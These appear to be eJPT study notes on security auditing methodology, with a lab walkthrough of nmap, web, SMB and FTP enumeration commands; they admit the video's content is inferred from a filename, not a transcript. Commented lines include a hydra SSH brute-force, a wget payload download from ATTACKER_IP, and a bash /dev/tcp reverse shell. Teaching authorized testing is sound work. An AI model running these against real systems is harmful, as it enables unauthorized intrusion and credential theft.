# 01 – Overview of Security Auditing (eJPT) — Study Notes

Note: No transcript was provided. The following is a conservative, curriculum-aligned summary inferred from the filename and typical eJPT content. Commands are generic, lab-friendly examples. Run only with written authorization and within scope.

## What the video covers (Introduction / big picture)
- Defines security auditing in the context of eJPT: systematic, authorized evaluation of systems, networks, and applications to identify weaknesses, misconfigurations, and vulnerabilities.
- Differentiates security auditing, vulnerability assessment, and penetration testing.
- Introduces common methodologies and standards (PTES, NIST SP 800-115, OWASP Testing Guide) and how they structure engagements.
- Emphasizes scope, rules of engagement (RoE), authorization, safety, and reporting.
- High-level phases: preparation, discovery, enumeration, vulnerability analysis, exploitation validation (if in-scope), post-exploitation checks (minimal in eJPT), and reporting.
- Outlines tools and evidence collection practices you’ll use throughout the eJPT learning path.

## Flow (ordered)
1. Define scope, objectives, and constraints; obtain written authorization.
2. Prepare workspace, note-taking, and baselines (targets, time windows, contacts).
3. Reconnaissance and asset discovery (passive/active).
4. Network mapping and port/service discovery.
5. Service/application enumeration (banner grabbing, protocol-specific checks).
6. Vulnerability triage (version mapping, default creds, common misconfigurations).
7. Exploitation validation where permitted (proof of concept, minimal-impact).
8. Post-exploitation and privilege checks (only as approved).
9. Evidence collection and integrity (timestamps, commands, hashes).
10. Risk rating and remediation guidance.
11. Debrief and reporting (executive summary + technical details).
12. Cleanup and confirmation (remove accounts/artifacts, verify stability).

## Tools highlighted
Likely referenced categories and representative tools:
- Scoping/Planning: Statement of Work, RoE templates, risk matrix (CVSS).
- Discovery/Scanning: nmap, ping/arp-scan, netdiscover.
- Enumeration:
  - Web: whatweb, curl, gobuster/feroxbuster, nikto, Burp Suite (Community).
  - SMB/LDAP: smbclient, enum4linux-ng, rpcclient, ldapsearch.
  - FTP/SSH: ftp, ssh, sftp, s_client (openssl).
- Credential testing (if authorized): hydra, medusa.
- Vulnerability lookup: searchsploit, NVD, vendor advisories.
- Traffic analysis: wireshark, tcpdump.
- Exploitation (lab): metasploit-framework, manual RCE patterns, reverse shells.
- Post-exploitation (lab): linPEAS/LinEnum, winPEAS, whoami/systeminfo.
- Utilities: nc, wget/curl, python3 -m http.server, tmux, seclists wordlists.
- Documentation: screenshots, script logs, nmap -oA, markdown notes.

## Typical command walkthrough (detailed, copy-paste friendly)
These commands model a safe, methodical audit workflow in a lab. Replace placeholders before running.

```bash
# 0) Legal and scope check (no command): Ensure written authorization, scope list, test windows, rate limits.

# 1) Workspace setup
export WK="$HOME/audit-$(date +%Y%m%d-%H%M)"
mkdir -p "$WK"/{scans,notes,loot,web,exploits}
cd "$WK"
echo "[*] Workspace: $WK"

# 2) Target definitions (edit these)
export NET="10.10.0.0/24"
export TGT="10.10.0.5"
echo -e "Network: $NET\nTarget:  $TGT" | tee notes/scope.txt

# 3) Host discovery (safe defaults)
nmap -sn "$NET" -oA scans/00-discovery
# Alternative:
# for i in {1..254}; do ping -c1 -W1 10.10.0.$i &>/dev/null && echo "Up: 10.10.0.$i"; done | tee scans/00-ping-sweep.txt

# 4) Full TCP port discovery on one host (tune min-rate to environment)
nmap -p- --min-rate 2000 -v -oA scans/10-fulltcp "$TGT"

# 5) Targeted service enumeration on discovered ports
# Replace ports with those found above, e.g., 22,80,139,445
export PORTS="22,80,139,445"
nmap -sC -sV -p "$PORTS" -oA scans/11-enum "$TGT"

# 6) HTTP/HTTPS enumeration
whatweb -a 3 "http://$TGT" | tee scans/20-whatweb.txt
curl -i -s -k "http://$TGT/" | tee scans/21-curl-home.txt
# Directory/content discovery (choose a suitable wordlist)
gobuster dir -u "http://$TGT/" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,txt,html,js -t 30 -o scans/22-gobuster-root.txt
# Basic vulnerability checks (non-intrusive)
nikto -h "http://$TGT" -o scans/23-nikto.txt

# 7) SMB enumeration (if 139/445 open)
smbclient -L "//$TGT/" -N | tee scans/30-smb-shares.txt
# Connect to a discovered share (read-only if possible)
# smbclient "//$TGT/public" -N -c 'recurse; ls' | tee scans/31-smb-public-listing.txt
enum4linux -a "$TGT" | tee scans/32-enum4linux.txt

# 8) FTP enumeration (if 21 open)
echo -e "open $TGT\nuser anonymous anonymous@\nls\nbye" | ftp -inv | tee scans/40-ftp-anon.txt

# 9) SSH banner/grab (if 22 open)
nc -nv "$TGT" 22 -w 3 | tee scans/50-ssh-banner.txt

# 10) Vulnerability triage
# Use service versions from nmap -sV to look up CVEs
# Example lookup with searchsploit:
searchsploit "OpenSSH" | tee scans/60-searchsploit-ssh.txt
searchsploit "Apache httpd" | tee -a scans/60-searchsploit-web.txt

# 11) Nmap vuln scripts (safe set; confirm allowance before running)
nmap --script=vuln -p "$PORTS" -oA scans/61-nmap-vuln "$TGT"

# 12) Credential testing (only if explicitly authorized)
# Prepare wordlists (example: rockyou)
# gzip -dk /usr/share/wordlists/rockyou.txt.gz
# hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$TGT -t 4 -f -I -o scans/70-hydra-ssh.txt

# 13) Web form testing via Burp Suite (manual, no direct command)
# Configure browser proxy to 127.0.0.1:8080 and intercept requests.

# 14) File transfer helpers (for PoC or enumeration in shells)
# Attacker web server:
# (in $WK/web) python3 -m http.server 8000
# Target download (Linux):
# wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh

# 15) Reverse shell listener (lab)
# Attacker:
# nc -lvnp 4444
# Target (if RCE, Linux):
# bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# 16) Evidence integrity
# Hash key files before/after:
sha256sum scans/* | tee notes/hashes.txt

# 17) Reporting artifacts
# Consolidate key outputs into notes/ and include timestamps
date -Is | tee -a notes/timeline.txt
```

## Practical tips
- Authorization first: Get a signed letter of engagement and clearly defined scope/targets, time windows, rate limits, and out-of-scope systems.
- Safety over speed: Prefer default/safe nmap scripts; avoid aggressive timing (-T5) in production-like environments.
- Be reproducible: Log commands and outputs, keep versions of tools, and timestamp evidence.
- Timebox and pivot smartly: If a path stalls, switch services (HTTP/SMB/FTP) and return later with new info.
- Wordlists matter: Choose appropriate lists from /usr/share/seclists based on target tech; don’t overshoot with massive lists unless allowed.
- Note-taking: Keep a simple per-target structure (findings, creds, paths, proofs, remediation ideas).
- Don’t assume: Always validate a vulnerability with minimal-impact PoC before claiming it.
- Respect data: Minimize data exfiltration; hash sensitive files if collected and store securely.
- Cleanup: Remove test accounts/artifacts, revert configuration changes, and confirm service health.

## Minimal cheat sheet (one-screen flow)
```bash
# Scope vars
NET="10.10.0.0/24"; TGT="10.10.0.5"; mkdir -p scans

# Discovery + ports
nmap -sn "$NET" -oA scans/disc
nmap -p- --min-rate 2000 -v -oA scans/full "$TGT"
PORTS=$(grep -oP '^[0-9]+/tcp.*open' scans/full.nmap | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')

# Service enum
nmap -sC -sV -p "$PORTS" -oA scans/enum "$TGT"
whatweb -a 3 "http://$TGT" | tee scans/http-whatweb.txt
gobuster dir -u "http://$TGT/" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,js -t 30 -o scans/http-gobuster.txt
nikto -h "http://$TGT" -o scans/http-nikto.txt
smbclient -L "//$TGT/" -N | tee scans/smb-shares.txt
enum4linux -a "$TGT" | tee scans/smb-enum.txt

# Vuln checks
nmap --script=vuln -p "$PORTS" -oA scans/vuln "$TGT"
searchsploit "$(grep 'Service Info' -A2 scans/enum.nmap | tr -d '\t')" | tee scans/searchsploit.txt
```

## Summary
- The session introduces security auditing and how it frames the eJPT methodology: plan → discover → enumerate → analyze → validate → report.
- It stresses ethics, scope/RoE, safe testing, and evidence-driven reporting aligned to recognized methodologies (PTES, NIST 800-115, OWASP).
- Use a consistent, low-impact workflow: discover hosts, scan ports, enumerate services, map versions to vulnerabilities, validate minimally, and document clearly.
- The provided commands give a practical baseline for lab scenarios and study, emphasizing clarity, safety, and reproducibility.